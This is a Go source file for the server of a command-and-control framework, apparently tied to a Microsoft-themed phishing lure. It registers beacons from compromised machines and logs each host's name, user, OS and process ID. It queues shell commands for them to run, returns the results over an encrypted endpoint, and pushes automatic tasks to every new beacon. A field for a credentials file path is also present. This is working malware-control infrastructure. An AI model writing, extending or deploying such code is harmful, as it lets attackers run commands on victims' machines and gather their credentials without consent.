package main

import (
	"fmt"
	"io"
	"net/http"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/nullbyter19/umbra-microsoft-lure/c2/proto"
)

// beaconState is the server's record of a single beacon.
type beaconState struct {
	ID      string
	Host    proto.HostInfo
	First   time.Time
	Last    time.Time
	Seq     uint64
	queue   []proto.Task
	results []proto.TaskResult
}

// hub tracks every beacon and serialises console output. Locking order is always
// h.mu before h.logmu; output is only ever printed with h.mu released.
type hub struct {
	mu        sync.Mutex
	byID      map[string]*beaconState
	taskN     uint64
	logmu     sync.Mutex
	credsPath string
}

func newHub(credsPath string) *hub {
	return &hub{byID: make(map[string]*beaconState), credsPath: credsPath}
}

func (h *hub) printf(format string, a ...any) {
	h.logmu.Lock()
	fmt.Printf(format+"\n", a...)
	h.logmu.Unlock()
}

// checkin records a beacon and returns (and drains) its pending tasks.
func (h *hub) checkin(req *proto.Request) (tasks []proto.Task, isNew bool) {
	h.mu.Lock()
	defer h.mu.Unlock()

	bs := h.byID[req.ID]
	now := time.Now()
	if bs == nil {
		bs = &beaconState{ID: req.ID, First: now}
		h.byID[req.ID] = bs
		isNew = true
	}
	bs.Host = req.Host
	bs.Last = now
	bs.Seq = req.Seq
	tasks = bs.queue
	bs.queue = nil
	return tasks, isNew
}

// addResults stores and prints the results of finished tasks.
func (h *hub) addResults(req *proto.Request) {
	h.mu.Lock()
	bs := h.byID[req.ID]
	if bs == nil {
		bs = &beaconState{ID: req.ID, First: time.Now()}
		h.byID[req.ID] = bs
	}
	bs.Last = time.Now()
	bs.results = append(bs.results, req.Results...)
	h.mu.Unlock()

	for _, r := range req.Results {
		out := r.Out
		if !r.OK {
			out = "[error] " + strings.TrimSpace(out)
		}
		h.printf("\n=== result %s from %s ===\n%s", r.TID, req.ID, indent(out))
	}
}

// enqueue appends a task for a known beacon and returns it.
func (h *hub) enqueue(id, op, arg string) (proto.Task, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	bs := h.byID[id]
	if bs == nil {
		return proto.Task{}, fmt.Errorf("unknown beacon %q (try: list)", id)
	}
	h.taskN++
	t := proto.Task{TID: fmt.Sprintf("t%d", h.taskN), Op: op, Arg: arg}
	bs.queue = append(bs.queue, t)
	return t, nil
}

// list returns a sorted snapshot of all beacons.
func (h *hub) list() []beaconState {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]beaconState, 0, len(h.byID))
	for _, bs := range h.byID {
		out = append(out, *bs)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].ID < out[j].ID })
	return out
}

func indent(s string) string {
	s = strings.TrimRight(s, "\r\n")
	if s == "" {
		return "  (no output)"
	}
	lines := strings.Split(s, "\n")
	for i := range lines {
		lines[i] = "  " + strings.TrimRight(lines[i], "\r")
	}
	return strings.Join(lines, "\n")
}

// c2Handler serves the encrypted beacon endpoint. auto holds tasks that are
// handed to a beacon on its very first check-in; this is what makes a fully
// automated end-to-end test possible without the interactive console.
type c2Handler struct {
	key  []byte
	hub  *hub
	path string
	auto []proto.Task
}

func (c *c2Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || r.URL.Path != c.path {
		http.NotFound(w, r)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 32<<20))
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var req proto.Request
	if err := proto.OpenMessage(c.key, body, &req); err != nil {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	var resp proto.Response
	switch req.Kind {
	case proto.KindCheckin:
		tasks, isNew := c.hub.checkin(&req)
		resp.Ack = true
		resp.Tasks = tasks
		if isNew && len(c.auto) > 0 {
			resp.Tasks = append(resp.Tasks, c.auto...)
		}
		if isNew {
			c.hub.printf("\n[+] new beacon %s  %s\\%s  %s/%s  pid=%d  (sleeping, task with: shell %s whoami)",
				req.ID, req.Host.Hostname, req.Host.User, req.Host.OS, req.Host.Arch, req.Host.PID, req.ID)
		}
	case proto.KindResult:
		resp.Ack = true
		c.hub.addResults(&req)
	default:
		c.hub.printf("[!] unknown message kind %q from %s", req.Kind, req.ID)
	}

	env, err := proto.SealMessage(c.key, resp)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(env)
}
